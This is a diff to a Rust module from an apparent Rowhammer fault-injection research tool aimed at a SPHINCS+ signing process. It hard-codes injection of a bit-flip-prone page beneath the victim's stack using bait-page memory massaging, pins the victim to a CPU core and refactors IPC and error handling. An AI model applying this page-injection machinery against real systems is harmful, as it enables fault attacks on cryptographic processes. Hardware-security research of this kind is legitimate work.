@@ -1,21 +1,20 @@
+use itertools::Itertools;
+use libc::sched_getcpu;
+use serde::Serialize;
+use sha2::{Digest, Sha256};
 use std::{
     collections::HashMap,
-    fs::File,
-    io::{BufRead, BufReader},
-    process::{ChildStdin, ChildStdout},
+    io::{BufRead, BufReader, Write},
+    mem,
+    os::fd::{FromRawFd, OwnedFd},
+    process::ChildStdout,
     thread,
     time::Duration,
 };
 
-use anyhow::bail;
-use itertools::Itertools;
-use libc::sched_getcpu;
-use serde::Serialize;
-
 use crate::{
     memory::{find_flippy_page, PfnResolver},
-    util::{PipeIPC, IPC, PAGE_SIZE},
-    victim::piped_channel,
+    util::PAGE_SIZE,
 };
 
 use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, VictimResult};
@@ -163,6 +162,15 @@ fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
     let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
 
+    // just put the page at offset 31
+    Some(InjectionConfig {
+        target_addr: addrs.first().copied().unwrap(),
+        flippy_page_size: PAGE_SIZE,
+        bait_count_after: bait_count_after.get(&31).copied().unwrap(),
+        bait_count_before: 0,
+        stack_offset: 31,
+    })
+    /*
     filter_addrs(addrs, &targets)
         .first()
         .map(|f| InjectionConfig {
@@ -174,7 +182,7 @@ fn find_injectable_page(addrs: Vec<usize>) -> Option<InjectionConfig> {
                 .expect("unsupported stack offset"),
             bait_count_before: 0,
             stack_offset: f.1.stack_offset,
-        })
+        })*/
 }
 
 impl SphincsPlus {
@@ -196,12 +204,55 @@ impl SphincsPlus {
         })
     }
 
+    pub fn new_with_config(
+        binary: String,
+        injection_config: InjectionConfig,
+    ) -> anyhow::Result<Self> {
+        Ok(Self {
+            state: State::Init {
+                binary,
+                injection_config,
+            },
+        })
+    }
+
     pub fn pid(&self) -> Option<u32> {
         match self.state {
             State::Running { ref child, .. } => Some(child.id()),
             _ => None,
         }
     }
+}
+
+pub fn spawn_reader_thread(
+    mut pipe: ChildStdout,
+) -> thread::JoinHandle<(Vec<String>, ChildStdout)> {
+    thread::spawn(move || {
+        let reader = BufReader::new(&mut pipe);
+        let mut lines = Vec::new();
+        let mut prev_empty = false;
+
+        for line in reader.lines() {
+            match line {
+                Ok(line) => {
+                    let next_empty = line.is_empty();
+                    if prev_empty && next_empty {
+                        break;
+                    }
+                    if !next_empty {
+                        lines.push(line);
+                    }
+                    prev_empty = next_empty;
+                }
+                Err(e) => {
+                    error!("Error reading line from child process: {}", e);
+                    break;
+                }
+            }
+        }
+
+        (lines, pipe) // Return both the collected lines and the pipe
+    })
 }
 
 impl HammerVictim for SphincsPlus {
@@ -255,30 +306,30 @@ impl HammerVictim for SphincsPlus {
                     None
                 };
 
-                // todo: maybe check injection (prime+probe?)
-                std::thread::sleep(Duration::from_millis(100));
-
                 // Pin the child to the next core
                 let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
                 let target_core = (get_current_core() + 1) % num_cores as usize;
-                info!("Pinning child to core {}", target_core);
-                set_process_affinity(child.id() as libc::pid_t, target_core);
+                let cid = child.id();
+                info!("Pinning procees {} to core {}", cid, target_core);
+                set_process_affinity(cid as libc::pid_t, target_core);
 
                 // Create a pipe for IPC
-                let pipe = piped_channel(&mut child).expect("Failed to pipe IPC");
-                // find flippy page
+                let stdout_thread = spawn_reader_thread(child.stdout.take().expect("stdout"));
                 self.state = State::Running {
                     target: binary.clone(),
                     child,
-                    pipe,
+                    stdout_thread,
                     stderr_logger,
                     target_pfn,
                     region_offset: injection_config.stack_offset,
                 };
+
+                // find flippy page
+                thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                 if let Err(e) = self.check_flippy_page_exists() {
                     error!("Failed to find flippy page: {:?}", e);
                     self.stop();
-                    Err(HammerVictimError::FlippyPageNotFound)
+                    Err(e)
                 } else {
                     Ok(())
                 }
@@ -329,7 +380,7 @@ impl HammerVictim for SphincsPlus {
 }
 
 impl SphincsPlus {
-    fn check_flippy_page_exists(&self) -> anyhow::Result<()> {
+    fn check_flippy_page_exists(&self) -> Result<(), HammerVictimError> {
         if let State::Running {
             child,
             target_pfn,
@@ -346,21 +397,20 @@ impl SphincsPlus {
                             "Flippy page offset mismatch: {} != {}",
                             flippy_page.region_offset, region_offset
                         );
-                        bail!(
-                            "Flippy page offset mismatch! Expected {}, got {}",
-                            region_offset,
-                            flippy_page.region_offset
-                        );
+                        return Err(HammerVictimError::FlippyPageOffsetMismatch {
+                            expected: *region_offset,
+                            actual: flippy_page,
+                        });
                     }
                     return Ok(());
                 }
                 Ok(None) => {
-                    bail!("Flippy page not found");
+                    return Err(HammerVictimError::FlippyPageNotFound);
                 }
-                Err(e) => return Err(e),
+                Err(e) => return Err(HammerVictimError::PageMapError(e)),
             }
         }
-        bail!("Invalid state: {}", self.state.description());
+        Err(HammerVictimError::NotRunning)
     }
 }
 
